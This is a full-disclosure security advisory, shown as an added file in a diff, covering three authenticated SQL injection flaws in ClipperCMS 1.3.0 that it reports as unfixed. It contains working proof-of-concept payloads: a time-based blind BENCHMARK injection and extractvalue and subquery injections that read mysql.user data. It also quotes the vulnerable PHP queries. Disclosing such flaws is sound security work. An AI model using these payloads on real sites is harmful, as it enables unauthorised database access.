@@ -1,0 +1,133 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    ClipperCMS 1.3.0
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://www.clippercms.com/
+Vulnerability Type:  SQL Injection
+Remote Exploitable:  Yes
+Reported to vendor:  10/02/2015
+Disclosed to public: 11/13/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+There are multiple SQL Injection vulnerabilities in ClipperCMS 1.3.0.
+
+An account with the role "Publisher" or "Administrator" is needed to exploit
+each of these vulnerabilities.
+
+3. SQL Injection 1 (Blind)
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+The id parameter of the web user editor is vulnerable to blind SQL Injection.
+
+To exploit this issue, an account is needed that has the right to manage web
+users. Users with the role "Publisher" or "Administrator" have this by default.
+
+Proof of Concept
+
+
+http://localhost//ClipperCMS-clipper_1.3.0/manager/index.php?a=88&id=1 AND IF(SUBSTRING(version(), 1, 1)='5',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null) %23
+-> true
+
+http://localhost//ClipperCMS-clipper_1.3.0/manager/index.php?a=88&id=1 AND IF(SUBSTRING(version(), 1, 1)='4',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null) %23
+-> false
+
+Code
+
+
+/manager/actions/mutate_web_user.dynamic.php
+$sql = "SELECT * FROM $dbase.`".$table_prefix."web_groups` where webuser=".$_GET['id']."";
+
+4. SQL Injection 2
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+When updating a user, the newusername parameter is vulnerable to SQL injection.
+
+To exploit this issue, an account is needed that has the right to manage web
+users. Users with the role "Publisher" or "Administrator" have this by default.
+
+Proof of Concept
+
+
+POST /ClipperCMS-clipper_1.3.0/manager/index.php?a=32 HTTP/1.1
+mode=12&id=3&blockedmode=0&stay=&oldusername=testtest
+&newusername=testtest' or extractvalue(1,concat(0x7e,(SELECT concat(user) FROM mysql.user limit 0,1))) -- -
+&newpassword=0&passwordgenmethod=g&specifiedpassword=&confirmpassword=&passwordnotifymethod=s&fullname=&email=foo3%40example.com&oldemail=foo3%40example.com&role=2&phone=&mobilephone=&fax=&state=&zip=&country=&dob=&gender=&comment=&failedlogincount=0&blocked=0&blockeduntil=&blockedafter=&manager_language=english&manager_login_startup=&allow_manager_access=1&allowed_ip=&manager_theme=&filemanager_path=&upload_images=&default_upload_images=1&upload_media=&default_upload_media=1&upload_flash=&default_upload_flash=1&upload_files=&default_upload_files=1&upload_maxsize=&which_editor=&editor_css_path=&rb_base_dir=&rb_base_url=&tinymce_editor_theme=&tinymce_custom_plugins=&tinymce_custom_buttons1=&tinymce_custom_buttons2=&tinymce_custom_buttons3=&tinymce_custom_buttons4=&tinymce_css_selectors=&photo=&save=Submit+Query
+
+Code
+
+
+/manager/processors/save_user_processor.php
+$sql = "UPDATE " . $modx->getFullTableName('manager_users') . "
+SET username='$newusername'" . $updatepasswordsql . "
+WHERE id=$id";
+
+5. SQL Injection 3
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+When updating a user, the country, role, blocked, blockeduntil, blockedafter,
+failedlogincount, and gender parameter are vulnerable to SQL injection.
+
+To exploit this issue, an account is needed that has the right to manage web
+users. Users with the role "Publisher" or "Administrator" have this by default.
+
+Proof of Concept
+
+The proof of concepts for the country, role, blocked, blockeduntil,
+failedlogincount, and blockedafter parameter are analog to this POC for gender:
+
+
+POST /ClipperCMS-clipper_1.3.0/manager/index.php?a=32 HTTP/1.1
+mode=12&id=3&blockedmode=0&stay=&oldusername=testtest&newusername=testtest&newpassword=0&passwordgenmethod=g&specifiedpassword=&confirmpassword=&passwordnotifymethod=s&fullname=&email=foo6%40example.com&oldemail=foo3%40example.com&role=2&phone=&mobilephone=&fax=&state=&zip=&country=&dob=
+&gender=2', fax=(SELECT concat(user) FROM mysql.user limit 0,1), dob='0
+&comment=&failedlogincount=0&blocked=0&blockeduntil=&blockedafter=&manager_language=english&manager_login_startup=&allow_manager_access=1&allowed_ip=&manager_theme=&filemanager_path=&upload_images=&default_upload_images=1&upload_media=&default_upload_media=1&upload_flash=&default_upload_flash=1&upload_files=&default_upload_files=1&upload_maxsize=&which_editor=&editor_css_path=&rb_base_dir=&rb_base_url=&tinymce_editor_theme=&tinymce_custom_plugins=&tinymce_custom_buttons1=&tinymce_custom_buttons2=&tinymce_custom_buttons3=&tinymce_custom_buttons4=&tinymce_css_selectors=&photo=&save=Submit+Query
+
+Visiting the overview page of that user will show the result of the injected
+query.
+
+Code
+
+
+/manager/processors/save_user_processor.php
+$sql = "UPDATE " . $modx->getFullTableName('user_attributes') . "
+SET fullname='$fullname', role='$roleid', email='$email', phone='$phone',
+mobilephone='$mobilephone', fax='$fax', zip='$zip', state='$state',
+country='$country', gender='$gender', dob='$dob', photo='$photo', comment='$comment',
+failedlogincount='$failedlogincount', blocked=$blocked, blockeduntil=$blockeduntil,
+blockedafter=$blockedafter
+WHERE internalKey=$id";
+
+6. Solution
+
+This issue has not been fixed by the vendor.
+
+7. Report Timeline
+
+10/02/2015 Informed Vendor about Issue (no reply)
+10/21/2015 Reminded Vendor of Disclosure Date (no reply)
+11/13/2015 Disclosed to public
+
+
+Blog Reference:
+http://blog.curesec.com/article/blog/ClipperCMS-130-SQL-Injection-99.html
